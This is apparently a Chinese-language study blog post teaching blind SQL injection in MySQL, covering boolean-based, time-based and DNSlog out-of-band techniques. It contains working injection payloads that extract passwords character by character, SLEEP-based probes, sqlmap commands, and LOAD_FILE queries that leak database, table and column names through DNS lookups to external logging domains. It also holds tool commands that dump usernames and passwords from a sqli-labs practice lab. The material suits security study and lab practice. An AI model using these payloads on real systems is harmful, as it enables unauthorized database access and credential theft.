---
title: SQL盲注
categories:
  - 学习
tags:
  - SQL注入
abbrlink: 179744d1
---

**SQL注入分类：**

- 回显正常---> 联合查询` union select`

- 回显报错-->报错注入：
         

  1. `extractvalue()`
  2. `updatexml()`
  3. `floor(rand()\*2)`

- 盲注：

  布尔盲注

  时间盲注
  
  DNSlog注入

## **SQL盲注概述**

### **原理**

- **核心问题**：应用程序存在SQL注入漏洞，但无法直接返回查询结果或错误信息（如页面无数据回显）。
- **攻击逻辑**：通过构造条件语句，观察页面的 **布尔状态（True/False）** 或 **时间延迟（Time Delay）**，间接推断数据库信息（如字段值、表名、数据库版本）。

### **适用场景**

- **布尔盲注**：页面响应有明显差异（如内容存在/消失、HTTP状态码变化）。
- **时间盲注**：页面响应无差异，但可通过注入时间函数触发延迟（如`SLEEP(5)`）。

------

## **布尔盲注（Boolean-Based Blind SQL Injection）**

### **原理与特点**

- **原理**：
  通过构造布尔条件（如`AND 1=1`或`AND 1=2`），根据页面是否返回预期结果（真/假状态）推断数据。
- **特点**
  - 依赖页面响应差异（如登录成功/失败、内容显示/隐藏）。
  - 效率较高，但需要逐字符猜解。

### **关键函数（MySQL）**

| 函数                            | 作用                                                |
| :------------------------------ | :-------------------------------------------------- |
| `SUBSTRING(str, start, length)` | 截取字符串的指定部分（从`start`开始，取`length`位） |
| `ASCII(char)`                   | 返回字符的ASCII码值（用于数字比较）                 |
| `LENGTH(str)`                   | 返回字符串长度                                      |
| `IF(condition, T, F)`           | 条件判断（若`condition`为真，执行`T`，否则执行`F`） |

### **攻击步骤**

#### **步骤1：验证注入点**

```sql
-- 正常页面（True条件）
/page?id=1' AND 1=1 -- 

-- 异常页面（False条件）
/page?id=1' AND 1=2 -- 
```

若两次请求的页面内容不同（如后者返回空白或错误），则存在布尔盲注漏洞。

#### **步骤2：推断数据长度**

```sql
-- 猜解users表中id=1的密码长度是否为8
/page?id=1' AND (SELECT LENGTH(password) FROM users WHERE id=1)=8 -- 
```

通过多次尝试（如长度=8、9、10），确定字段长度。

#### **步骤3：逐字符猜解**

```sql
-- 猜解密码首字符是否为 'a'（ASCII码=97）
/page?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97 -- 
```

若页面返回正常，则首字符为`a`；否则继续尝试其他ASCII值（如98对应`b`）。

#### **步骤4：自动化工具**

使用 `sqlmap` 自动化猜解：

```bash
sqlmap -u "http://example.com/page?id=1" --technique=B --dbms=mysql --batch
```

#### **步骤5：脚本运行**

```python

```



### **实际示例**

假设存在以下漏洞URL：
`http://example.com/news.php?id=1`

**攻击过程**：

1. **验证注入点**：

   ```sql
   http://example.com/news.php?id=1 AND 1=1  -- 正常显示新闻
   http://example.com/news.php?id=1 AND 1=2  -- 新闻消失（确认漏洞）
   ```

2. **猜解数据库名长度**：

   ```sql
   http://example.com/news.php?id=1 AND LENGTH(DATABASE())=4 -- 
   ```

   若页面正常，说明数据库名长度为4。

3. **猜解数据库名**：

   ```sql
   -- 猜解第一个字符是否为 'm'（ASCII=109）
   http://example.com/news.php?id=1 AND ASCII(SUBSTRING(DATABASE(),1,1))=109 -- 
   ```

   若页面正常，继续猜解后续字符，最终得到数据库名（如`mydb`）。

------

## **时间盲注（Time-Based Blind SQL Injection）**

### **原理与特点**

- **原理**：
  通过注入时间延迟函数（如`SLEEP(5)`），若条件为真则触发延迟，否则立即返回。
- **特点**
  - 适用于页面无响应差异的场景（如统一返回空白或默认页面）。
  - 效率较低（需等待延迟时间）。

### **关键函数（MySQL）**

| 函数                     | 作用                                  |
| :----------------------- | :------------------------------------ |
| `SLEEP(seconds)`         | 使数据库暂停执行指定秒数              |
| `IF(condition, T, F)`    | 条件判断，结合时间函数触发延迟        |
| `BENCHMARK(count, expr)` | 重复执行表达式（如MD5），产生计算延迟 |

### **攻击步骤**

#### **步骤1：验证时间延迟**

```sql
-- 注入5秒延迟，观察响应时间是否增加
/page?id=1' AND SLEEP(5) -- 
```

#### **步骤2：构造条件延迟**

```sql
-- 若密码首字符为 'a'，触发5秒延迟
/page?id=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0) -- 
```

若响应时间显著增加，则首字符为`a`。

#### **步骤3：自动化工具**

```bash
sqlmap -u "http://example.com/page?id=1" --technique=T --dbms=mysql --batch
```

------

### **实际示例**

假设页面无论注入条件如何均返回相同内容，但存在时间盲注漏洞。

**攻击过程**：

1. **验证延迟注入**：

   ```sql
   http://example.com/news.php?id=1 AND SLEEP(5) -- 
   ```

   若响应时间增加5秒，确认漏洞存在。

2. **猜解数据库名首字符**：

   ```sql
   http://example.com/news.php?id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=109, SLEEP(5), 0) -- 
   ```

   若延迟5秒，首字符为`m`（ASCII=109）。

------

## **总结**

| 对比项       | 布尔盲注                 | 时间盲注           |
| :----------- | :----------------------- | :----------------- |
| **依赖条件** | 页面真/假响应差异        | 响应时间延迟       |
| **效率**     | 较高（快速逐字符猜解）   | 较低（需等待延迟） |
| **适用场景** | 页面有明显状态变化       | 页面无内容差异     |
| **关键函数** | `SUBSTRING()`, `ASCII()` | `SLEEP()`, `IF()`  |



## DNSlog注入

### **原理**

- **数据外传机制**：
  通过构造 SQL 语句，将查询结果嵌入域名中，利用数据库的 DNS 解析功能，使目标数据库向攻击者控制的 DNS 服务器发起请求。
- **日志记录**：
  攻击者通过监控 DNS 服务器日志，获取包含敏感数据的域名请求记录。

### **前提条件**
权限与配置

MySQL 需启用 secure_file_priv（默认禁用），可通过以下命令检查：
`SHOW VARIABLES LIKE 'secure_file_priv';`
若返回 NULL，需在 my.cnf 中设置 secure_file_priv = '' 并重启服务。

`查询是否可以使用dnslog注入`

`http://example.com?id=1' UNION SELECT 1,@@secure_file_priv,3 -- `

**目标场景**

- 注入点无回显（无法直接看到查询结果）。
- 传统盲注（布尔/时间）效率低下或不可行。

### 需要用到的网站

`http://ceye.io` 

`http://www.dnslog.cn/`

![DNSlog图片](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgweb.imgimage-20250309163406040.png)

### **使用**

```sql
[触发DNS的函数](CONCAT('[子域名前缀]', (SELECT 查询语句), '[DNSlog域名]'))

获取库名
and (select load_file(concat("//",(select HEX(database()),".DNS路径/1.txt(随意文件名)"))) -- +
再从DNSlog.cn网站获取内容
获取表名
 and (SELECT LOAD_FILE(CONCAT('//',(SELECT HEX(table_name) FROM information_schema.tables WHERE table_schema='目标库名' LIMIT 0,1),".DNS路径/1.txt(随意文件名)"))) -- 
获取列名
AND (SELECT LOAD_FILE(CONCAT('//',(SELECT HEX(column_name) FROM information_schema.columns WHERE table_name='目标表名' AND table_schema='目标库名' LIMIT 0,1),".DNS路径/1.txt(随意文件名)"))) -- 

使用 HEX 编码绕过特殊字符限制（如@，空格）
使用limit 0，1 强制查询返回第一行结果，确保注入语句语法正确
```

### DNSlog自动注入

**需要用到的网站**

`http://ceye.io` 

**工具**

[DNSlogsqlinj](https://github.com/adooo/dnslogsqlinj)

[DNSlog注入工具使用教程](https://blog.csdn.net/qq_56607768/article/details/124224966)

**注入流程**

[DNSlog自动化注入教程](https://www.bilibili.com/video/BV1c34y1h7So?spm_id_from=333.788.player.switch&vd_source=3d9e793b3ade52daa18c644e09cfb1b5&p=19)

```sql
获取数据库名:
python2.7 dnslogSql.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+" --dbs
获取数据库security下的表名:
python2.7 dnslogSql.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+" -D security --tables
获取users表的列名:
python2.7 dnslogSql.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+" -D security -T users --columns
获取uses表中的数据:
python2.7 dnslogSql.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+" -D security -T users -C username,password --dump

```

